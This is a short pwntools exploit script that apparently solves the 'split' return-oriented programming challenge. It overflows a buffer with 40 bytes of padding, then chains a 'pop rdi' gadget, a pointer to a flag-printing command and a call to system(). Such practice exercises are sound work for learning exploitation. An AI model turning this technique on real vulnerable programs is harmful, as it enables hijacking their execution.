from pwn import * 

#0x0000000000400883 : pop rdi ; ret

r = process('./split')

CAT_FLAG=0x00601060 #pointer to bash command to print flag
SYSTEM_ADDR=0x00400810  #place where system is called

exploit=b'A'*40
exploit+=p64(0x00400883)    #pop rdi 
exploit+=p64(CAT_FLAG)  #value of rdi after pop
exploit+=p64(SYSTEM_ADDR)   #call to system

r.sendline(exploit)
r.interactive()
